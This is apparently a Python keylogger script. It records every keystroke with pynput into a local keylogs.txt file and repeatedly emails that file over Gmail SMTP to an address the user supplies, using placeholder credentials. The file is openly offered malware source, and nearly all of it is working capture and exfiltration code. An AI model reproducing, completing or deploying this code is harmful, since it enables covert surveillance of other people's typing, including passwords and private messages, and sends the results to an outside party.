from pynput.keyboard import Key, Listener
import logging
import os

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

import time

#to get the current directory
log_dir = os. getcwd()

logging.basicConfig(filename=(log_dir + "/keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

#to save the in user/userName
#log_dir = ""
#logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')


#this function is used to log the key press into 'key'
def onPress(key):
    logging.info(str(key))

#this function is used to call off the script when hit esc
def onRelease(key):
    if key == Key.esc:
        return False

def send_mail():
    #put your gmail id, password, sender address over here
    #for email_user turn on less secure app access to work

    email_user = 'write_your_email'
    email_password = 'write_your_password'
    email_send = 'email_you_are_sending_this_to'
    #put any subject you like
    subject = 'write_the_subject'

    #fill in the body of the email

    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject
    #put any body you like
    body = 'write_the_body_of_email'
    msg.attach(MIMEText(body,'plain'))

    #do not change anything from here to bottom of the function

    filename='keylogs.txt'
    attachment  =open(filename,'rb')

    part = MIMEBase('application','octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',"attachment; filename= "+filename)
    
    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email_user,email_password)


    server.sendmail(email_user,email_send,text)
    server.quit()

with Listener(on_press=onPress, on_release=onRelease) as listener:
    listener.join()

#this will loop in every 10 minute and send email
while True:
    send_mail()
    time.sleep(600) 
